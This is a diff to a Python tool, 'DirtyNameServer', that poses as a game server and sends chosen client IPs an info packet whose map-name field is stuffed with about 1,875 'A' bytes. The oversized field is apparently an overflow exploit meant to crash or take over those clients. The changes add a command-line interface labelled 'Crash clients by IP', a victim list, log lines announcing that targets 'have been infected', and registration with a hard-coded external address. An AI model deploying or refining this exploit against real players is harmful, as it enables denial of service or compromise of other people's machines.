@@ -1,4 +1,5 @@
 from datetime import datetime
+import argparse
 import Server
 import Packet
 import Logger
@@ -7,15 +8,15 @@ import Logger
 class DirtyNameServer(Server.Server):
     def __init__(self, injected_ip_list, *args, **kwargs):
         super(DirtyNameServer, self).__init__(*args, **kwargs)
-        self.ip_list = dict((ip, False) for ip in injected_ip_list)
+        self.ip_list = injected_ip_list
 
     def start(self, *args, **kwargs):
         self.logger.info("Started server for injecting DirtyName vulnerability")
+        self.logger.info("These are the victims {}".format(self.ip_list))
         super(DirtyNameServer, self).start(*args, **kwargs)
 
     def _get_info_handler(self, received_packet, address):
-        if address[0] in self.ip_list.keys():
-            if self.ip_list[address[0]] == False:
+        if address[0] in self.ip_list:
                 packet = Packet.Packet()
                 packet.id = Packet.TYPE_INFO_RESPONSE
                 packet.info = self.info
@@ -25,14 +26,21 @@ class DirtyNameServer(Server.Server):
                 else:
                     packet.info["challenge"] = challenge[:-1]
 
-                self.logger.info("Injecting {}")
-                packet.info["A" * 4000] = "b"
-                self._send(packet, address)
-                self.ip_list[address[0]] = True
+                self.logger.info("{} has been infected".format(address))
+                #packet.info["mapname"] = "A" * 4000
+                #self._send(packet, address)
+                packet.info["mapname"] = "A" * (2064-189)
+                b = Packet.pack(packet)
+                print len(b)
+                self.server.sendto(b, address)
 
 def main():
-    Logger.MainLogger.log_to_file(datetime.now().strftime("Logs\\%Y_%m_%d_%H_%M_%S.log"))
-    server = DirtyNameServer(["192.168.84.1"], "0.0.0.0", 20103)
+    parser = argparse.ArgumentParser(description="Crash clients by IP")
+    parser.add_argument("port", type=int)
+    parser.add_argument("ip_list", metavar="IP", nargs="+", help="IP list")
+    args = parser.parse_args()
+    Logger.MainLogger.log_to_file(datetime.now().strftime("Logs\\%Y_%m_%d_%H_%M_%S_DirtyName.log"))
+    server = DirtyNameServer(args.ip_list, "0.0.0.0", args.port, "104.40.23.123", 20110)
     server.start()
     Logger.MainLogger.close()
 
